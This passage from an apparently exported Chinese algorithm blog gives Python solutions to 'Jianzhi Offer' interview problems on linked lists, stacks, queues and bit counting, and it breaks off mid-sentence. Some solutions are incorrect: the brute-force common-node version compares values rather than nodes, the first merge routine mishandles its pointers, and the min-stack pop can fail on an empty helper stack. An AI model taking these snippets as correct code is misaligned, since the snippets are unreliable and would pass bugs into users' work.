<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　暴力破解。在第一个链表上顺序遍历每一个结点，每遍历到一个结点，就在第二个链表上顺序遍历每个结点。如果在第二个链表上有一个结点与第一个链表上的结点一样，则说明两个链表在这个结点上重合，于是就找到了他们的公共结点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindFirstCommonNode</span><span class="params">(self, pHead1, pHead2)</span>:</span></div><div class="line">        <span class="keyword">while</span> pHead1:</div><div class="line">            tmp = pHead2</div><div class="line">            <span class="keyword">while</span> tmp:</div><div class="line">                <span class="keyword">if</span> tmp.val == pHead1.val:</div><div class="line">                    <span class="keyword">return</span> tmp</div><div class="line">                tmp = tmp.next</div><div class="line">            pHead1 = pHead1.next</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　利用栈结构。如果两个链表有公共结点，那么其公共结点之后的结点就是一样的。因此，可以从后往前遍历两个链表，将链表的每个结点依次压入栈（先进后出）中，再依次弹出。如果栈顶元素不相同，则公共结点就是前一个弹出的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindFirstCommonNode</span><span class="params">(self, pHead1, pHead2)</span>:</span></div><div class="line">        <span class="keyword">if</span> pHead1 <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> pHead2 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        stack1 = []</div><div class="line">        stack2 = []</div><div class="line">        <span class="keyword">while</span> pHead1:  <span class="comment"># 链表1入栈</span></div><div class="line">            stack1.append(pHead1)</div><div class="line">            pHead1 = pHead1.next</div><div class="line">        <span class="keyword">while</span> pHead2:  <span class="comment"># 链表2入栈</span></div><div class="line">            stack2.append(pHead2)</div><div class="line">            pHead2 = pHead2.next</div><div class="line">        result = <span class="keyword">None</span></div><div class="line">        <span class="keyword">while</span> stack1 <span class="keyword">and</span> stack2 <span class="keyword">and</span> stack1[<span class="number">-1</span>] == stack2[<span class="number">-1</span>]:  <span class="comment"># 出栈</span></div><div class="line">            result = stack1.pop()</div><div class="line">            stack2.pop()</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h5 id="题解-3"><a href="#题解-3" class="headerlink" title="题解 3"></a>题解 3</h5><p>　　如果两个链表有公共结点，那么其公共结点之后的结点就是一样的。那么两个链表头到公共结点的距离差就是两个链表的长度差，因此，只需要求出两个链表的长度只差 k，让长的链表先走 k 个结点，再继续同时遍历两个链表，当两个链表的指针相等的时候，就是第一个相同的结点。 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindFirstCommonNode</span><span class="params">(self, pHead1, pHead2)</span>:</span></div><div class="line">        len1 = len2 = <span class="number">0</span></div><div class="line">        tmp1 = pHead1</div><div class="line">        tmp2 = pHead2</div><div class="line">        <span class="keyword">while</span> tmp1:</div><div class="line">            len1 += <span class="number">1</span></div><div class="line">            tmp1 = tmp1.next</div><div class="line">        <span class="keyword">while</span> tmp2:</div><div class="line">            len2 += <span class="number">1</span></div><div class="line">            tmp2 = tmp2.next</div><div class="line">        <span class="keyword">if</span> len1 &gt; len2:  <span class="comment"># 先走k步</span></div><div class="line">            k = len1 - len2</div><div class="line">            <span class="keyword">while</span> k:</div><div class="line">                k -= <span class="number">1</span></div><div class="line">                pHead1 = pHead1.next</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            k = len2 - len1</div><div class="line">            <span class="keyword">while</span> k:</div><div class="line">                k -= <span class="number">1</span></div><div class="line">                pHead2 = pHead2.next</div><div class="line">        <span class="keyword">while</span> pHead1 <span class="keyword">and</span> pHead2:</div><div class="line">            <span class="keyword">if</span> pHead1 == pHead2:</div><div class="line">                <span class="keyword">return</span> pHead1</div><div class="line">            pHead1 = pHead1.next</div><div class="line">            pHead2 = pHead2.next</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<h4 id="合并两个排序的链表"><a href="#合并两个排序的链表" class="headerlink" title="合并两个排序的链表"></a>合并两个排序的链表</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　找到两个链表中头节点值相对更小的链表，将其作为主链表，第二个链表中的元素则不断加入到主链表中。具体策略是：主链表定义两个指针，指向两个相邻的元素。当第二个链表中的元素值小于主链表中第二个指针时，将第二个链表的当前元素插入到主链表两个指针指向的元素中间，并调整指针指向。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回合并后列表</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Merge</span><span class="params">(self, pHead1, pHead2)</span>:</span></div><div class="line">        <span class="keyword">if</span> pHead1 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead2</div><div class="line">        <span class="keyword">if</span> pHead2 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead1</div><div class="line"></div><div class="line">        head = ListNode(<span class="number">0</span>)</div><div class="line">        <span class="keyword">if</span> pHead1.val &lt; pHead2.val:</div><div class="line">            head.next = pHead1</div><div class="line">            secHead = pHead2</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            head.next = pHead2</div><div class="line">            secHead = pHead1</div><div class="line">        mainHead = head.next.next</div><div class="line">        <span class="keyword">while</span> mainHead <span class="keyword">and</span> secHead:</div><div class="line">            <span class="keyword">if</span> mainHead.val &lt;= secHead.val:</div><div class="line">                mainHead = mainHead.next</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                tmp = secHead</div><div class="line">                tmp.next = mainHead.next</div><div class="line">                mainHead.next = tmp</div><div class="line">                secHead = secHead.next</div><div class="line">       </div><div class="line">        <span class="keyword">return</span> head.next</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　递归解法。每次比较两个头节点，将较小的合并，再检查下一个节点，最后得到的就是合并后的链表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回合并后列表</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Merge</span><span class="params">(self, pHead1, pHead2)</span>:</span></div><div class="line">        <span class="keyword">if</span> pHead1 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead2</div><div class="line">        <span class="keyword">if</span> pHead2 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead1</div><div class="line">        head = ListNode(<span class="number">0</span>)</div><div class="line">        <span class="keyword">if</span> pHead1.val &lt; pHead2.val:</div><div class="line">            head = pHead1</div><div class="line">            head.next = self.Merge(pHead1.next, pHead2)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            head = pHead2</div><div class="line">            head.next = self.Merge(pHead1, pHead2.next)</div><div class="line">        <span class="keyword">return</span> head</div></pre></td></tr></table></figure>
<h4 id="删除链表中重复的结点"><a href="#删除链表中重复的结点" class="headerlink" title="删除链表中重复的结点"></a>删除链表中重复的结点</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　原本以为是去重的任务，即把重复的元素删除，也就是链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;3-&gt;4-&gt;5：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplication</span><span class="params">(self, pHead)</span>:</span></div><div class="line">        <span class="keyword">if</span> pHead <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> pHead.next <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead</div><div class="line">        head = ListNode(<span class="number">0</span>)  <span class="comment"># 指向pHead的结点</span></div><div class="line">        head.next = pHead</div><div class="line">        <span class="keyword">while</span> pHead:</div><div class="line">            <span class="keyword">while</span> pHead.next <span class="keyword">and</span> pHead.val == pHead.next.val:  <span class="comment"># 去除重复</span></div><div class="line">                pHead.next = pHead.next.next</div><div class="line">            pHead = pHead.next  <span class="comment"># 指针后移</span></div><div class="line">        <span class="keyword">return</span> head.next</div></pre></td></tr></table></figure>
<p>　　但是，题目的意思是只要重复出现过的元素就都删掉，只保留没有重复出现的。因此，</p>
<ul>
<li>在原链表之前链一个结点 <code>head</code>，用它的 <code>.next</code> 属性返回原列表去重后的链表头指针；</li>
<li>使用两个指针 <code>cur</code> 和 <code>pre</code>，分别指当前判断的结点和当前结点的前一个结点；</li>
<li>因为可能会出现连续重复的结点值，所以需要循环内再套循环判断。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplication</span><span class="params">(self, pHead)</span>:</span></div><div class="line">        <span class="keyword">if</span> pHead <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> pHead.next <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead</div><div class="line">        head = ListNode(<span class="number">0</span>)  <span class="comment"># 指向pHead的结点</span></div><div class="line">        head.next = pHead</div><div class="line">        pre = head</div><div class="line">        cur = pHead</div><div class="line">        <span class="keyword">while</span> cur:</div><div class="line">            <span class="keyword">if</span> cur.next <span class="keyword">and</span> cur.val == cur.next.val:  <span class="comment"># 处理重复</span></div><div class="line">                tmp = cur.next</div><div class="line">                <span class="keyword">while</span> tmp <span class="keyword">and</span> tmp.val == cur.val:</div><div class="line">                    tmp = tmp.next</div><div class="line">                pre.next = tmp</div><div class="line">                cur = tmp</div><div class="line">            <span class="keyword">else</span>:  <span class="comment"># 不是重复的，指针后移</span></div><div class="line">                pre = cur</div><div class="line">                cur = cur.next</div><div class="line">        <span class="keyword">return</span> head.next</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-栈和队列(上)</title>
    <url>/2019/08/06/%E5%89%91%E6%8C%87offer-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97-%E4%B8%8A/</url>
    <content><![CDATA[<center>秋招，来了！</center>

<a id="more"></a>
<h4 id="用两个栈实现队列"><a href="#用两个栈实现队列" class="headerlink" title="用两个栈实现队列"></a>用两个栈实现队列</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　入栈时，将元素压入第一个栈；出栈时，先把第一个栈的元素依次弹出并压入到第二个栈，此时第二个栈的栈顶元素即为队头元素，弹出栈顶元素作为结果，然后再把第二个栈的元素依次弹出并压入到第一个栈，最后返回结果即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.stack1 = []</div><div class="line">        self.stack2 = []</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, node)</span>:</span></div><div class="line">        self.stack1.append(node)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> self.stack1:</div><div class="line">            self.stack2.append(self.stack1.pop())</div><div class="line">        result = <span class="keyword">None</span></div><div class="line">        <span class="keyword">if</span> self.stack2:</div><div class="line">            result = self.stack2.pop()</div><div class="line">        <span class="keyword">while</span> self.stack2:</div><div class="line">            self.stack1.append(self.stack2.pop())</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>　　用两个队列来实现一个栈，完成栈的 Push 和 Pop 操作。入栈时直接压入 queue1 中，出栈时先将除 queue1 最后一个元素外依次 Pop 出队列，并压入 queue2 中，将留在 queue1 中的最后一个元素出队列即为出队元素，之后再次将 queue2 中的元素压回 queue1 中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.queue1 = []</div><div class="line">        self.queue2 = []</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, node)</span>:</span></div><div class="line">        self.queue1.append(node)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> self.queue1:</div><div class="line">            self.queue2.append(self.queue1[<span class="number">0</span>])</div><div class="line">            <span class="keyword">del</span> self.queue1[<span class="number">0</span>]</div><div class="line">        result = <span class="keyword">None</span></div><div class="line">        <span class="keyword">if</span> self.queue2:</div><div class="line">            result = self.queue2[<span class="number">-1</span>]</div><div class="line">            <span class="keyword">del</span> self.queue2[<span class="number">-1</span>]</div><div class="line">        <span class="keyword">while</span> self.queue2:</div><div class="line">            self.queue1.append(self.queue2[<span class="number">0</span>])</div><div class="line">            <span class="keyword">del</span> self.queue2[<span class="number">0</span>]</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h4 id="包含min函数的栈"><a href="#包含min函数的栈" class="headerlink" title="包含min函数的栈"></a>包含min函数的栈</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　定义栈的数据结构，请在该类型中实现一个能够得到栈中所含最小元素的min函数（时间复杂度应为O(1)）。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　通过列表存放栈的元素，通过内置函数 min 得到列表中最小的元素即为栈中最小的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.stack = []</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, node)</span>:</span></div><div class="line">        self.stack.append(node)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.stack:</div><div class="line">            <span class="keyword">return</span> self.stack.pop()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.stack[<span class="number">-1</span>]</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">min</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> min(self.stack)</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　设置一个变量存放最小值，每一次压栈的时候进行比较。再设置一个辅助栈，用于存放当前栈的最小值（设置辅助栈是因为，若最小值出栈了，最小值需要进行更新，因此需要辅助栈来保存次小值）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.stack = []</div><div class="line">        self.min_stack = []</div><div class="line">        self.min_item = float(<span class="string">'inf'</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, node)</span>:</span></div><div class="line">        <span class="keyword">if</span> node &lt; self.min_item:</div><div class="line">            self.min_item = node</div><div class="line">            self.min_stack.append(node) </div><div class="line">        self.stack.append(node)</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.stack:</div><div class="line">            item = self.stack.pop()</div><div class="line">            <span class="keyword">if</span> item == self.min_stack[<span class="number">-1</span>]:</div><div class="line">                self.min_stack.pop()</div><div class="line">                self.min_item = self.min_stack[<span class="number">-1</span>]</div><div class="line">            <span class="keyword">return</span> item</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.stack[<span class="number">-1</span>]</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">min</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.min_item</div></pre></td></tr></table></figure>
<h4 id="栈的压入、弹出序列"><a href="#栈的压入、弹出序列" class="headerlink" title="栈的压入、弹出序列"></a>栈的压入、弹出序列</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4,5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的）</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　借助一个辅助列表，模拟栈的操作，遍历压入序列，每次压入一个元素，然后检查栈顶元素是否与 j 指向的弹出序列的元素相等，如果是则弹出，并检查弹出序列的下一个元素，再次判断栈顶元素是否与 j 指向的弹出序列的元素相等，直到不相等，再执行压入操作。最后判断栈是否为空，如果为空则证明第二个序列就是该栈的弹出序列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">IsPopOrder</span><span class="params">(self, pushV, popV)</span>:</span></div><div class="line">        len_push = len(pushV)</div><div class="line">        len_pop = len(popV)</div><div class="line">        <span class="keyword">if</span> len_push != len_pop:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        stack = []</div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len_push):</div><div class="line">            stack.append(pushV[i])</div><div class="line">            <span class="keyword">while</span> j&lt;len_pop <span class="keyword">and</span> popV[j] == stack[<span class="number">-1</span>]:</div><div class="line">                stack.pop()</div><div class="line">                j += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> stack:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-位运算</title>
    <url>/2019/08/04/%E5%89%91%E6%8C%87offer-%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="二进制中-1-的个数"><a href="#二进制中-1-的个数" class="headerlink" title="二进制中 1 的个数"></a>二进制中 1 的个数</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个整数，输出该数二进制表示中1的个数。其中负数用补码表示。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　在计算机系统中，数值都是用补码来表示和存储的。而原码就是数值的二进制数表示，最高位1表示负数。补码：正数的补码是其原码本身；负数的补码是其绝对值的原码最高位符号位不变，其它位取反，再加1。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">3的原码：</div><div class="line">00000000000000000000000000000011（32位）</div><div class="line">-1的原码：</div><div class="line">10000000000000000000000000000001（32位）</div><div class="line"></div><div class="line">3的补码（正数的补码是其原码本身）：</div><div class="line">00000000000000000000000000000011</div><div class="line">-1的补码(原码最高位符号位不变，其它位取反)：</div><div class="line">11111111111111111111111111111110</div><div class="line">再加1：</div><div class="line">11111111111111111111111111111110 + 1</div><div class="line">得：</div><div class="line">11111111111111111111111111111111</div><div class="line"></div><div class="line">使用补码的好处在于，可以将符号位和数值位统一处理，加法与减法也可以统一处理。例如，3-1等价于3+(-1) ，对于计算机来说将3和-1的补码直接相加就可以：</div><div class="line"></div><div class="line">3 + (-1) = </div><div class="line">00000000000000000000000000000011 +</div><div class="line">11111111111111111111111111111111</div><div class="line">00000000000000000000000000000010 = 2 （最高位的1溢出了，直接丢弃）</div></pre></td></tr></table></figure>
<p>　　这个题目可以通过将 n 不断右移，然后和1相与判断最低位是否是1，从而实现求 1 的个数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NumberOf1</span><span class="params">(self, n)</span>:</span></div><div class="line">        cnt = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> n:</div><div class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span>:</div><div class="line">                cnt = cnt + <span class="number">1</span></div><div class="line">            n = n &gt;&gt; <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> cnt</div></pre></td></tr></table></figure>
<p>　　但是，要注意，由于负数的最高位总要设为 1，右移操作最终会变为 0xffffffff 而陷入死循环。因此，利用 n &amp; 0xffffffff 将负数 n 转化为正数，而它们的二进制形式是相同的，而对正数的二进制进行操作非常简单清晰，统计到这个正数二进制形式中1的个数就是原来负数的二进制形式中1的个数，这样就可以消除负数的影响。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NumberOf1</span><span class="params">(self, n)</span>:</span></div><div class="line">        cnt = <span class="number">0</span>;</div><div class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:  <span class="comment"># 得到负数的补码</span></div><div class="line">            n = n &amp; <span class="number">0xffffffff</span></div><div class="line">        <span class="keyword">while</span> n:</div><div class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span>:</div><div class="line">                cnt = cnt + <span class="number">1</span></div><div class="line">            n = n &gt;&gt; <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> cnt</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　如果一个整数不为 0，那么这个整数至少有一位是 1。如果我们把这个整数减 1，那么原来处在整数最右边的1 就会变为 0，原来在 1 后面的所有的 0 都会变成 1 (如果最右边的 1 后面还有 0 的话)。其余所有位将不会受到影响。例如，二进制数1100，从右边数起第三位是处于最右边的1。减去 1 后，第三位变成 0，它后面的两位 0 变成了 1，而前面的 1 保持不变，因此得到的结果是 1011。</p>
<p>　　我们发现减 1 的结果是把最右边的一个 1 开始的所有位都取反了。这个时候如果我们再把原来的整数和减去1之后的结果做与运算，从原来整数最右边一个 1 那一位开始所有位都会变成 0。如 1100&amp;1011=1000。也就是说，把一个整数减去 1，再和原整数做与运算，会把该整数最右边一个 1 变成0。那么一个整数的二进制有多少个1，就可以进行多少次这样的操作。  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NumberOf1</span><span class="params">(self, n)</span>:</span></div><div class="line">        cnt = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> n != <span class="number">0</span>:</div><div class="line">            cnt += <span class="number">1</span></div><div class="line">            n = n &amp; (n<span class="number">-1</span>)</div><div class="line">        <span class="keyword">return</span> cnt</div></pre></td></tr></table></figure>
<p>　　同样，需要考虑负数的情况：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NumberOf1</span><span class="params">(self, n)</span>:</span></div><div class="line">        cnt = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:	<span class="comment"># 得到负数的补码</span></div><div class="line">            n = n &amp; <span class="number">0xffffffff</span></div><div class="line">        <span class="keyword">while</span> n:</div><div class="line">            n =  n &amp; (n - <span class="number">1</span>)</div><div class="line">            cnt += <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> cnt</div></pre></td></tr></table></figure>
<h4 id="数值的整数次方"><a href="#数值的整数次方" class="headerlink" title="数值的整数次方"></a>数值的整数次方</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　直接</p>
